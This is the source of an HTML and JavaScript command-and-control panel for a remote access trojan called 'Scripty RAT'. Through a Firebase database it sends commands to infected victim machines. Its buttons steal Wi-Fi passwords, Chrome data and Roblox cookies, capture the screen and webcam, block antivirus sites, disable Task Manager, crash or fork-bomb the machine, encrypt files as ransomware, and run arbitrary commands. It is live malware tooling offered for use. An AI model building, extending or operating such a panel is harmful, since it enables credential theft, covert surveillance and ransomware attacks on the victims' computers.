<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Scripty RAT | C2</title>
    <link rel="icon" type="image/png" href="image.jpg">
    <script src="https://unpkg.com/@phosphor-icons/web"></script>
    <style>
        :root {
            --bg-dark: #0f172a;
            --card-bg: #1e293b;
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --primary: #3b82f6;
            --primary-hover: #2563eb;
            --danger: #ef4444;
            --danger-hover: #dc2626;
            --success: #22c55e;
            --success-hover: #16a34a;
            --warn: #f59e0b;
            --warn-hover: #d97706;
            --border: rgba(255,255,255,0.08);
        }

        * { box-sizing: border-box; }
        body {
            background-color: var(--bg-dark);
            color: var(--text-main);
            font-family: 'Inter', 'Segoe UI', sans-serif;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }

        h1 {
            font-weight: 800;
            font-size: 2rem;
            margin-bottom: 2rem;
            background: linear-gradient(to right, var(--primary), #8b5cf6);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: -0.5px;
        }

        /* TOP BAR */
        .top-bar {
            position: fixed;
            top: 0; left: 0; right: 0;
            background: rgba(15, 23, 42, 0.95);
            backdrop-filter: blur(10px);
            padding: 1px 20px; 
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid var(--border);
            z-index: 1000;
        }
        .user-info { font-size: 0.9rem; font-weight: 600; color: var(--text-muted); }
        .logout-btn {
            background: transparent;
            border: 1px solid var(--danger);
            color: var(--danger);
            padding: 6px 16px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.8rem;
            transition: all 0.2s;
        }
        .logout-btn:hover { background: var(--danger); color: white; }

        /* SELECTOR */
        .control-panel {
            width: 100%;
            max-width: 1100px;
            margin-top: 80px;
        }

        .selector-box {
            background: var(--card-bg);
            border: 1px solid var(--border);
            padding: 25px;
            border-radius: 12px;
            margin-bottom: 30px;
            text-align: center;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
        }
        select {
            background: #0f172a;
            color: white;
            border: 1px solid #334155;
            padding: 12px;
            border-radius: 8px;
            width: 100%;
            max-width: 400px;
            font-size: 1rem;
            margin-top: 10px;
            outline: none;
        }
        select:focus { border-color: var(--primary); }

        /* GRID DASHBOARD */
        .dashboard-grid {
            display: none; 
            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
            gap: 20px;
        }

        .card {
            background: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 20px;
            transition: transform 0.2s;
        }
        .card:hover { transform: translateY(-2px); border-color: rgba(255,255,255,0.15); }

        .card-title {
            font-size: 1.1rem;
            font-weight: 700;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
            color: var(--text-main);
            padding-bottom: 12px;
            border-bottom: 1px solid var(--border);
        }
        .card-title i { font-size: 1.3rem; }

        /* BUTTON GRID (Uniform 2 Columns) */
        .btn-grid {
            display: grid;
            grid-template-columns: 1fr 1fr; /* ALWAYS 2 equal columns */
            gap: 10px;
        }
        
        /* UNIFORM BUTTON STYLE */
        button {
            border: none;
            border-radius: 8px;
            padding: 0 10px; /* Horizontal padding only */
            font-size: 0.85rem;
            font-weight: 600;
            cursor: pointer;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: background 0.2s, transform 0.1s;
            
            /* FORCED SAME SIZE */
            width: 100%;
            height: 50px; /* Fixed Height */
            
            /* Text Handling */
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        
        button:active { transform: scale(0.98); }

        .btn-primary { background: var(--primary); }
        .btn-primary:hover { background: var(--primary-hover); }

        .btn-danger { background: var(--danger); }
        .btn-danger:hover { background: var(--danger-hover); }

        .btn-warn { background: var(--warn); color: #0f172a; }
        .btn-warn:hover { background: var(--warn-hover); }

        .btn-success { background: var(--success); }
        .btn-success:hover { background: var(--success-hover); }

        .btn-neutral { background: #475569; }
        .btn-neutral:hover { background: #64748b; }

        /* Full width slider container */
        .slider-container {
            grid-column: span 2; 
            padding: 5px 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        /* SLIDER */
        input[type=range] {
            width: 100%;
            height: 6px;
            background: #334155;
            border-radius: 5px;
            outline: none;
            -webkit-appearance: none;
        }
        input[type=range]::-webkit-slider-thumb {
            -webkit-appearance: none;
            width: 18px;
            height: 18px;
            background: var(--primary);
            border-radius: 50%;
            cursor: pointer;
        }

        /* LOGS */
        .logs-box {
            width: 100%;
            max-width: 1100px;
            margin-top: 30px;
            background: #0f172a;
            border: 1px solid #334155;
            border-radius: 12px;
            padding: 15px;
        }
        .log-list {
            list-style: none;
            padding: 0;
            margin: 0;
            max-height: 150px;
            overflow-y: auto;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85rem;
        }
        .log-item {
            padding: 6px 0;
            border-bottom: 1px solid #1e293b;
            color: #cbd5e1;
            display: flex;
            justify-content: space-between;
        }
        .log-ts { color: #64748b; font-size: 0.75rem; }

    </style>
</head>
<body>

    <!-- TOP BAR -->
    <div class="top-bar">
        <h1>Scripty RAT <span style="font-size:1rem; opacity:0.7; font-weight:400;">C2 PANEL</span></h1>
        <div style="display:flex; align-items:center; gap:15px;">
            <span id="userDisplay" class="user-info">Authenticating...</span>
            <button class="logout-btn" onclick="logout()">LOGOUT</button>
        </div>
    </div>

    <div class="control-panel">
        
        <!-- SELECTOR -->
        <div class="selector-box">
            <i class="ph ph-desktop" style="font-size:2rem; color:var(--primary); margin-bottom:10px;"></i>
            <h3 style="margin:0;">Select Target Machine</h3>
            <select id="categorySelect" onchange="selectPC()">
                <option value="">-- Waiting for Connection --</option>
            </select>
            <p id="targetStatus" style="margin-top:10px; color:var(--text-muted); font-size:0.9rem;">No target selected</p>
        </div>

        <!-- DASHBOARD -->
        <div id="mainDashboard" class="dashboard-grid">

            <!-- 1. POWER -->
            <div class="card" style="border-top: 3px solid var(--warn);">
                <div class="card-title"><i class="ph ph-lightning" style="color:var(--warn);"></i> Power Control</div>
                <div class="btn-grid">
                    <button class="btn-primary" style="background-color: var(--warn); border: none; color: white;" onclick="cmd('lock_pc')"></i> Lock PC</button>
                    <button class="btn-warn" style="background-color: var(--warn); border: none; color: white;" onclick="cmd('restart_pc')"></i> Restart</button>
                    <button class="btn-danger" style="background-color: var(--warn); border: none; color: white;" onclick="confirmAction('shutdown_pc')"></i> Shutdown</button>
                    <button class="btn-danger" style="background-color: var(--warn); border: none; color: white;" onclick="confirmAction('bsod')"></i> BSOD</button>
                </div>
            </div>

            <!-- 2. SECURITY & NETWORK -->
            <div class="card" style="border-top: 3px solid var(--danger);">
                <div class="card-title"><i class="ph ph-shield-warning" style="color:var(--danger);"></i> Security & Net</div>
                <div class="btn-grid">
                    <button class="btn-danger" style="background-color: var(--danger); border: none;" onclick="toggleInput(true)"></i> Block Input</button>
                    <button class="btn-success" style="background-color: var(--danger); border: none;" onclick="toggleInput(false)"></i> Unblock Input</button>
                    <button class="btn-danger" style="background-color: var(--danger); border: none;" onclick="cmd('block_av_sites')"></i> Block AV Sites</button>
                    <button class="btn-success" style="background-color: var(--danger); border: none;" onclick="cmd('unblock_av_sites')"></i> Unblock AV</button>
                    <button class="btn-danger" style="background-color: var(--danger); border: none;" onclick="confirmAction('set_critical')"></i> Set Critical</button>
                    <button class="btn-success" style="background-color: var(--danger); border: none;" onclick="cmd('unset_critical')"></i> Unset Critical</button>
                    <button class="btn-primary" style=" background-color: var(--danger); border: none;" onclick="cmd('check_admin')"></i> Check Admin Status</button>
                </div>
            </div>

            <!-- 3. STEALERS -->
            <div class="card" style="border-top: 3px solid #a855f7;">
                <div class="card-title"><i class="ph ph-database" style="color:#a855f7;"></i> Data Extraction</div>
                <div class="btn-grid">
                    <button class="btn-primary" style="background-color: #a855f7; border: none; color: white;" onclick="cmd('wifi_stealer')"></i> Steal Wi-Fi</button>
                    <button class="btn-warn" style="background-color: #a855f7; border: none; color: white;" onclick="cmd('grab_roblox')"></i> Roblox Cookie</button>
                    <button class="btn-warn full-width" style="background-color: #a855f7; border: none; color: white;" onclick="cmd('chrome_steal')">Steal Chrome</button>
                    <button class="btn-info full-width" style="background-color: #a855f7; border: none; color: white;" onclick="cmd('get_ip')">Get IP Info</button>
                    <button class="btn-info full-width" style="background-color: #a855f7; border: none; color: white;" onclick="cmd('screenshot')">Screenshot</button>
                    <button class="btn-warn full-width" style="background-color: #a855f7; border: none; color: white;" onclick="cmd('webcam')">Webcam</button>

                </div>
            </div>
            <!-- 4. ENCRYPTION -->
            <div class="card" style="border-top: 3px solid #00e2e2;">
                <div class="card-title"><i class="ph ph-lock-key" style="color:#00e2e2;"></i> Ransomware</div>
                <div class="btn-grid">
                    <button class="btn-danger full-width" style="grid-column: span 2;background-color: #00e2e2; border: none; color: white;" onclick="confirmAction('scriptybomb')">SCRIPTY BOMB (RANSOMWARE)</button>
                    <button class="btn-danger" style="background-color: #00e2e2; border: none; color: white;" onclick="askForceEncrypt()"></i> Encrypt</button>
                    <button class="btn-success" style="background-color: #00e2e2; border: none; color: white;" onclick="askDecrypt()"></i> Decrypt</button>
                    <button class="btn-danger full-width" style="background-color: #00e2e2; border: none; color: white;" onclick="confirmAction('enable_safe_mode')">Enable Safe Mode</button>
                </div>
            </div>

            <!-- 5. MEDIA & TROLLING -->
            <div class="card" style="border-top: 3px solid var(--success);">
                <div class="card-title"><i class="ph ph-speaker-high" style="color:var(--success);"></i> Media & Troll</div>
                <div class="btn-grid">
                    <button class="btn-primary" style="background-color: var(--success); border: none; color: white;" onclick="askTTS()"></i> TTS Speak</button>
                    <button class="btn-warn" style="background-color: var(--success); border: none; color: white;" onclick="cmd('jumpscare')"></i> Jumpscare</button>
                    <button class="btn-primary" style="background-color: var(--success); border: none; color: white;" onclick="askMsgBox()"></i> Fake Error</button>
                    <button class="btn-danger" style="background-color: var(--success); border: none; color: white;" onclick="cmd('block_screen')"></i> Block Screen</button>
                    <button class="btn-neutral" style="background-color: var(--success); border: none; color: white;" onclick="cmd('hide_taskbar')"></i> Hide Taskbar</button>
                    <button class="btn-primary" style="background-color: var(--success); border: none; color: white;" onclick="cmd('show_taskbar')"></i> Show Taskbar</button>
                    <button class="btn-danger full-width" style="background-color: var(--success); border: none; color: white;" onclick="confirmAction('forkbomb')">FORK BOMB</button>
                    
                    <div class="slider-container">
                        <input type="range" min="0" max="100" value="50" onchange="setVolume(this.value)">
                    </div>
                </div>
            </div>
            <!-- 6. System -->
            <div class="card" style="border-top: 3px solid #badb00;">
                <div class="card-title"><i class="ph ph-lightning" style="color:var(--warn);"></i> Power Control</div>
                <div class="btn-grid">
                    <button class="btn-danger" style="background-color: #badb00; border: none; color: white;" onclick="cmd('taskmgr_off')">Disable TaskMgr</button>
                    <button class="btn-success" style="background-color: #badb00; border: none; color: white;" onclick="cmd('taskmgr_on')">Enable TaskMgr</button>
                    <button class="btn-warn" style="background-color: #badb00; border: none; color: white;" onclick="cmd('check_av')">Check AV</button>
                    <button class="btn-info full-width" style="background-color: #badb00; border: none; color: white;" onclick="askCD()">CD Directory</button>
                    <button class="btn-neutral full-width" style="background-color: #badb00;border: none; color: white;" onclick="askExecute()">Execute Command</button>
                </div>
            </div>

        </div>

        <!-- LOGS -->
        <div class="logs-box">
            <h4 style="margin-top:0; color:var(--text-muted); font-size:0.8rem; text-transform:uppercase;">Activity Log</h4>
            <ul class="log-list" id="logList"></ul>
        </div>

    </div>

    <!-- SCRIPT LOGIC -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
        import { getDatabase, ref, set, get, child, push, onValue, limitToLast, query } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        // CONFIG
        const firebaseConfig = {
            apiKey: "AIzaSyBhG3jjUoP6F-MHIqYKP7TvCh4FQ_Rfcd0",
            authDomain: "potkan-5132c.firebaseapp.com",
            databaseURL: "https://potkan-5132c-default-rtdb.firebaseio.com/",
            projectId: "potkan-5132c",
            storageBucket: "potkan-5132c.firebasestorage.app",
            messagingSenderId: "1049909900706",
            appId: "1:1049909900706:web:f4d5b811a98760f0862efb"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app); 
        const db = getDatabase(app);
        const dbRef = ref(db);
        const ADMIN_UIDS = [
            "Zp3AZxKLcLNy7MvEYc9zxqc5Fr82",
            "sJSL8EjvFhMpoiD4yaAThWDKsf32"
        ]; 

        onAuthStateChanged(auth, (user) => {
            if (user && ADMIN_UIDS.includes(user.uid)) {
                document.getElementById('userDisplay').innerText = user.email;
            } else {
                window.location.href = "index.html";
            }
        });

        window.logout = function() {
            signOut(auth)
                .then(() => {
                    console.log("Signed out successfully");
                    window.location.href = "index.html";
                })
                .catch((error) => {
                    console.error("Sign Out Error", error);
                    alert("Error logging out: " + error.message);
                });
        };

        window.currentTargetID = null;
        window.currentPCName = "Unknown";

        // LOAD PCS
        get(child(dbRef, `discord_structure`)).then((snapshot) => {
            const select = document.getElementById('categorySelect');
            if (snapshot.exists()) {
                const data = snapshot.val();
                const structure = data.structure || data;
                select.innerHTML = `<option value="">-- Select Target --</option>`;
                for (const [serverName, categories] of Object.entries(structure)) {
                    if (serverName === "last_updated") continue;
                    const group = document.createElement('optgroup');
                    group.label = serverName;
                    for (const catName of Object.keys(categories)) {
                        const option = document.createElement('option');
                        option.value = JSON.stringify({ server: serverName, category: catName });
                        option.innerText = `üñ•Ô∏è ${catName}`;
                        group.appendChild(option);
                    }
                    select.appendChild(group);
                }
            }
        });

        window.selectPC = function() {
            const val = document.getElementById('categorySelect').value;
            const dashboard = document.getElementById('mainDashboard');
            const status = document.getElementById('targetStatus');

            if (!val) {
                dashboard.style.display = "none";
                status.innerText = "No target selected";
                return;
            }
            
            const { server, category } = JSON.parse(val);
            window.currentPCName = category;
            
            get(child(dbRef, `discord_structure`)).then((snap) => {
                const channels = (snap.val().structure || snap.val())[server][category];
                const targetNames = ["remote-access", "ùï£ùïñùïûùï†ùï•ùïñ-ùïíùïîùïîùïñùï§ùï§", "cmd", "terminal"];
                let foundID = null;

                for (const [id, name] of Object.entries(channels)) {
                    if (targetNames.includes(name.toLowerCase())) { foundID = id; break; }
                }

                if (foundID) {
                    window.currentTargetID = foundID;
                    dashboard.style.display = "grid"; 
                    
                    updatePanelStatus();
                } else {
                    dashboard.style.display = "none";
                    status.innerHTML = `<span style="color:var(--danger)">‚óè Error:</span> Remote access channel missing`;
                }
            });
        };

        const logsRef = query(ref(db, 'logs'), limitToLast(15));

        let onlineStatus = {};

        onValue(ref(db, 'status'), (snap) => {
            if(snap.exists()) {
                onlineStatus = snap.val();
            }
        });

        get(child(dbRef, `discord_structure`)).then((snapshot) => {
            const select = document.getElementById('categorySelect');
            if (snapshot.exists()) {
                const data = snapshot.val();
                const structure = data.structure || data;
                
                select.innerHTML = `<option value="">-- Select Target --</option>`;
                
                for (const [serverName, categories] of Object.entries(structure)) {
                    if (serverName === "last_updated") continue;
                    
                    const group = document.createElement('optgroup');
                    group.label = serverName;
                    
                    for (const catName of Object.keys(categories)) {
                        const option = document.createElement('option');
                        option.value = JSON.stringify({ server: serverName, category: catName });
                        option.innerText = `üñ•Ô∏è ${catName}`; 
                        group.appendChild(option);
                    }
                    select.appendChild(group);
                }
            } else {
                select.innerHTML = '<option>No PCs Found</option>';
            }
        });
        onValue(logsRef, (snap) => {
            const list = document.getElementById('logList');
            list.innerHTML = ""; 
            if(snap.exists()) {
                Object.values(snap.val()).reverse().forEach(log => {
                    const li = document.createElement('li');
                    li.className = 'log-item';
                    li.innerHTML = `<span>> ${log.message}</span><span class="log-ts">${new Date(log.timestamp).toLocaleTimeString()}</span>`;
                    list.appendChild(li);
                });
            }
        });

        // ACTIONS

        function updatePanelStatus() {
            if (!window.currentPCName || window.currentPCName === "Unknown") return;

            const lastSeen = onlineStatus[window.currentPCName]?.last_seen || 0;
            const isOnline = (Date.now() - lastSeen) < 20000; // 20s Timeout
            
            const status = document.getElementById('targetStatus');
            
            if (isOnline) {
                status.innerHTML = `<span style="color:var(--success)">‚óè ONLINE:</span> ${window.currentPCName} is active.`;
            } else {
                status.innerHTML = `<span style="color:var(--danger)">‚óè OFFLINE:</span> ${window.currentPCName} is unreachable.`;
            }
        }

        setInterval(updatePanelStatus, 1000);

        function writeDB(data) {
            if (!window.currentTargetID) return alert("Select a Target first!");
            data.target_id = window.currentTargetID;
            data.timestamp = Date.now();
            set(ref(db, 'queue/pending'), data);
            
            let msg = data.type.replace('_', ' ').toUpperCase();
            if(data.text) msg += ` "${data.text}"`;
            push(ref(db, 'logs'), { message: `[${window.currentPCName}] ${msg}`, timestamp: Date.now() });
        }

        window.cmd = (type) => writeDB({ type });
        window.confirmAction = (type) => { if(confirm("Are you sure?")) cmd(type); };
        window.toggleInput = (block) => cmd(block ? 'disable_input' : 'enable_input');
        window.askCD = () => { const p = prompt("Path:"); if(p) writeDB({type:'cd', path:p}); };
        window.askExecute = () => { const c = prompt("Command (e.g. dir):"); if(c) writeDB({type:'execute', cmd:c}); };

        window.askTTS = () => { const t = prompt("Text to speak:"); if(t) writeDB({type:'tts', text:t}); };
        window.askMsgBox = () => { const t = prompt("Message:"); if(t) writeDB({type:'msgbox', text:t}); };
        window.setVolume = (v) => writeDB({type:'volume', value:v});
        
        window.askForceEncrypt = () => {
            const p = prompt("Password (optional):");
            if(confirm("‚ö† ENCRYPT FILES? This is destructive.")) writeDB({type:'force_encrypt', password: p || "scripty_rat_best_777"});
        };
        window.askDecrypt = () => {
            const p = prompt("Decryption Password:");
            if(p) writeDB({type:'decrypt_files', password: p});
        };
    </script>
</body>
</html>
